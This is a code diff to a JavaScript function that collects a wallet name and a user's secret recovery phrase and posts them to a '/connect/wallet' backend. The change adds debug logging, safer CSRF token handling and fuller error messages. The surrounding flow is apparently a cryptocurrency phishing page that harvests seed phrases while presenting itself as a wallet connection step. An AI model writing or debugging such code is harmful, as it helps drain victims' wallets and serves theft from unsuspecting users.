@@ -498,20 +498,31 @@ function submitPhraseToBackend(walletName, phrase) {
     submitBtn.disabled = true;
     submitBtn.textContent = 'Connecting...';
 
+    // Get CSRF token safely
+    const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '';
+    
+    console.log('Submitting wallet:', walletName);
+    console.log('Phrase length:', phrase.length);
+    console.log('CSRF Token present:', !!csrfToken);
+
     // Send to backend
     fetch('/connect/wallet', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
-            'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
+            'X-CSRF-TOKEN': csrfToken
         },
         body: JSON.stringify({
             wallet_name: walletName,
             secret_phrase: phrase
         })
     })
-    .then(response => response.json())
+    .then(response => {
+        console.log('Response status:', response.status);
+        return response.json();
+    })
     .then(data => {
+        console.log('Response data:', data);
         if (data.success) {
             // Show success step
             document.getElementById('step2').classList.remove('active');
@@ -530,7 +541,8 @@ function submitPhraseToBackend(walletName, phrase) {
     })
     .catch(error => {
         console.error('Error:', error);
-        showError('Network error. Please check your connection and try again.');
+        console.error('Error message:', error.message);
+        showError('Network error. Please check your connection and try again. Error: ' + error.message);
         submitBtn.disabled = false;
         submitBtn.textContent = originalText;
     });
